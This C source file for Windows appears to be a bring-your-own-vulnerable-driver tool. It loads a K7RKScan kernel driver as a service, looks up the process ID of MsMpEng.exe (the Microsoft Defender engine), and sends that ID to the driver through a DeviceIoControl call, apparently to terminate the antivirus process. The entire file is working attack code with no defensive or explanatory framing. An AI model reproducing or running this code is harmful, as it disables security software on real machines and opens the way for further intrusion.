#include <windows.h>
#include <stdio.h>	
#include <tlhelp32.h>

#define IoControlCode 0x222018

DWORD getPidByProcessName(LPCWSTR lpProcessName) {
	DWORD pid = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed with error:%lu\n", GetLastError());
		return -1;
	}
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32FirstW(hSnapshot, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, lpProcessName) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}
		} while (Process32NextW(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return pid;
}

BOOL LoadDriver(LPCSTR lpServiceName, LPCSTR lpDisplayName, LPCSTR lpBinaryPathName) {
	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!hManager) {
		printf(L"OpenSCManagerA failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	printf("[+] OpenSCManagerA Success\n");

	SC_HANDLE hService = CreateServiceA(
		hManager,
		lpServiceName,
		lpDisplayName,
		SERVICE_START | DELETE | SERVICE_STOP,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		lpBinaryPathName,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (!hService) {
		printf("CreateServiceA failed with error:%lu\n", GetLastError());
		CloseHandle(hManager);
		return FALSE;
	}

	printf("[+] CreateServiceA Success\n");

	if (!StartServiceA(hService, 0, NULL)) {
		printf("StartServiceA failed with error:%lu\n", GetLastError());
		CloseHandle(hService);
		CloseHandle(hManager);
		return FALSE;
	}

	printf("[+] StartServiceA Success\n");

	CloseHandle(hService);
	CloseHandle(hManager);

	return TRUE;
}

int main() {
	LPCSTR lpServiceName = "K7RKScan";
	LPCSTR lpDisplayName = "Dispaly K7RKScan";
	LPCSTR lpBinaryPathName = "C:\\Users\\Public\\K7RKScan_1516.sys";

	if (LoadDriver(lpServiceName, lpDisplayName, lpBinaryPathName) == FALSE) {
		return -1;
	}

	printf("[+] LoadDriver Success\n");

	LPCWSTR lpProcessName = L"MsMpEng.exe";
	DWORD pid = getPidByProcessName(lpProcessName);

	if (pid == 0) {
		return -1;
	}

	printf("[+] Get pid: %lu Success\n", pid);

	HANDLE hDevice = CreateFileA("\\\\.\\DosK7RKScnDrv", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == NULL) {
		printf("CreateFileA failed with error:%lu\n", GetLastError());
		return -1;
	}

	printf("[+] CreateFileA Success\n");

	DWORD dwBytesReturned = 0;
	DWORD dwRel = DeviceIoControl(hDevice, IoControlCode, &pid, sizeof(DWORD), NULL, 0, &dwBytesReturned, NULL);
	if (!dwRel) {
		printf("DeviceIoControl failed with error:%lu\n", GetLastError());
		CloseHandle(hDevice);
		return -1;
	}

	printf("[+] DeviceIoControl Success\n");

	return 0;
}